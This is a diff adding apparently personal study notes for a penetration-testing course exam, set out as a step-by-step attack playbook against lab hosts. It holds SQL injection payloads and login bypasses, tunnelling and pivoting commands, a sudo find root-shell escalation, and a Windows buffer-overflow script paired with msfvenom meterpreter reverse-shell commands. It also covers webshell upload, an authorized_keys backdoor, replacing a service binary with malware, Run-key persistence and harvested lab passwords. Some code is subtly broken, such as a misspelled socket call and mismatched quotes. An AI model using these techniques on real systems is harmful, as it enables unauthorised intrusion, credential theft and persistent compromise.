@@ -1,0 +1,260 @@
+ip - 10.50.39.220
+
+==============================================================================
+initial 3 steps
+
+###steps/methodology
+
+	host discovery
+	N/A
+	
+	port discovery
+	nmap -Pn -sT -T4 10.50.39.220 -p80,22,4444,2222,4242,9999,3889,8080
+	
+	port interregation 
+	nc 10.50.39.220 <ports found from above>
+
+=============================================================================
+###Web Recon
+
+nikto -h 10.50.39.220
+-/scripts/
+system_user=user2
+user_password=EAGLESIsARE78
+
+-/login.html
+	if you see a login page use the post method sql first
+	if nothing useful is found go to network tab, request page, and turn on raw (copy put into url)
+
+# all you can get from login page is users and pass don't try golden statement
+# the only thing you can do with directory transversal is look at /etc/hosts nd /etc/passwd
+# ROT13 and base64 are the only encoding types
+
+
+nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.39.220	(nikto and this can return safe stuff but worth to run both)
+# had the same results
+
+ssh user2@10.50.39.220
+#first thing is get a bash shell(bash or /bin/bash), then run whoami and hostname
+==============================================================================
+###Privilege Escalation
+sudo -l
+# no results
+
+find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+paste the end of the path in GTFObins
+
+# no results
+
+which gdb
+==============================================================================
+###find next pivot
+
+cat /etc/hosts
+192.168.28.181
+
+ping sweep
+for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
+# results: 192.168.28.172, and 192.168.28.181
+# look at don't touch ip board
+==============================================================================
+ip - 192.168.28.181,172
+
+ssh user2@10.50.39.220 -D 9050
+
+proxychains nmap -Pn -sT -T4 192.168.28.181,172 -p80,22,4444,2222,4242,9999,3889,8080
+
+#as soon as you finish scan close dynamic tunnel tab
+
+ ssh user2@10.50.39.220 -L<rhp>:192.168.28.181:80
+
+firefox - 127.0.0.1:<rhp>
+
+###SQL INJECTIONS
+#radio buttons indicate sql injection so are tables
+
+0. Identify SQL Database (NOT LOGIN)
+1. Identify method for SQL Database VAraibles
+  1.1 Integers? Strings? Variable Names? Get? Post?
+2. Identify vulnerable field
+  2.1 try EVERY field
+3. Identify number of Columns <- skip and perish
+  3.1 UNION SELECT 1,2,3,4
+  3.2 verify placement of columns
+4. Golden statement
+  4.1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; 
+  4.2 ensure golden statement lines up with step 3 (padding, formatting)
+5. use golden statement to create custom queries
+6. ????
+7. profit, pass the exam, leave COSC forever
+###
+
+ex. php?product=<go through all fields> OR 1=1;#
+columns - php?product=7 UNION select 1,2,3;#		(you can add more if you get an error)
+	golden statement - php?product=7 UNION select 1,3,2;#
+		php?product=7 UNION select table_schema,column_name,table_name FROM information_schema.columns;#
+			php?product=7 UNION select username,name,user_id FROM siteusers.users;#
+						  <came from right(colums)>    <left>    <middle>
+	#sql database might turn sideways...
+==============================================================================
+ip - 192.168.28.72
+ssh user2@10.50.39.220 -L<rhp>:192.168.28.172:22
+ssh Aaron@127.0.0.1 -p <rhp>
+-whoami
+-hostname
+-bash
+	sudo -l
+# results /usr/bin/find
+
+GTFO - sudo find . exec /bin/bash \; -quit
+            <if there is a ./ delete it>	
+
+cat /etc/hosts
+for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
+# results 192.168.28.179
+
+ssh Aaron@127.0.0.1 -p <rhp>
+
+proxychains nmap -Pn -sT -T4 192.168.28.179 -p80,22,4444,2222,4242,9999,3889,8080
+# banner grap
+make tunnel to machine using port 9999
+
+set payload windows/meterpreter/reverse_tcp
+use multi/handler
+set LHOST 0.0.0.0
+set LPORT <same rhp>
+
+
+---------------------------
+import socket
+buf = "TRUN /.:/'
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += '\x90' *20
+
+#shellcode command = msfvenom -p windows/meterpreter/reverse_tcp LHOST=<linops ip> LPORT=<rhp> -b '\x00' -f python
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.conect(('0.0.0.0', <tunnel port>))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+==============================================================================
+if you see a page of text on the test wbe servers and don't want to read through it  all view page source
+------------------------------------------------------------------------------
+###UPLOADING WEBSHELL
+use robots.txt or go to /uploads in url
+upload webshell.php (it's in fg web day 1)
+ssh-keygen -t rsa (press enter for all prompts)
+cat ~/.ssh/id_rsa.pub (copy key)
+paste it in vim |  echo"<; paste key>" >> /home/directory/.ssh/authorized_keys
+ls -latr home/directory (to see if .ssh is there, create t if it's not)
+-----------------------------------------------------------------------------
+###WINDOWS BINARY REPLACEMENT
+
+way to find executables
+- check services (every user can use them)
+windows search bar "services" - look for blank or "obvious" description (clcik description tab to organize them)
+double click on it, in the path it'll show executable
+then go to file explorer and click view (make sure file name extensions and hidden items are checked)
+start at this pc, then c, program files,....(follow path) - right click to rename | drag malware in and rename ".dll|.exe" to orig name, reboot after
+
+once escalated on windows run you might need to run:
+windows cmd: auditpol /get /category:* | findstr /i "success failure"
+
+**** THINK RUN KEYS FOR PERSISTANCE ON WINDOWS GO THERE FIRST
+-----------------------------------------------------------------------------
+###LINUX EXPLOITATION BUFFER OVERFLOW
+
+*you need to use peda
+#func is an example of executable
+
+./func (if it asks for something it's input if it's not you'll need to do ./func ;<>) #vulnerable func
+linux box: gdb func
+pdisass main      (green is system calls and you're not looking for printf)
+pdisass <vulnetable func>
+
+
+(use wire mask for random generated)
+------------------------------------------------------
+in script:
+
+#!/usr/bin/python3
+offset = "<random generated from wiremask>"
+print(offset)
+------------------------------------------------------
+
+run <<< $(python lin_buf.py) #if it's parameters no triple <<<
+
+do this on target machine:
+env - gdb func
+unset env LINES 
+unset env COLUMNS
+show env #should have nothing
+run
+info proc map
+find /b <start addr 1 below heap>, <end addr 1 above stack>, 0xff, 0xe4
+#grab a handful of them
+add them to script
+
+------------------------------------------------------
+script after:
+
+#!/usr/bin/python3
+
+offset = "A" * 62
+
+eip = '\x<>\x<>\x<>\<>'	in reverse order 
+'''
+<paste handful> split address up to make it easier
+'''
+
+nop = "\x90" * 15
+
+#generates shellcode# msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+
+<paste shellcode>
+
+print(offset + eip + nop + buf)
+------------------------------------------------------
+back on linops 
+
+sudo ./func <<< $(python lin_bu.py) #remove <<< if parameters
+
+
+##put script in temp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+website login - 1'OR 1='1
+aaron account
+
+in url -
+login.php?username=aaron' OR 1='1&passwd=aaron' OR 1='1
+
+results:
+Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+
+
+user2 - EaglesIsARE78
+user3 - Bob4THEEapples
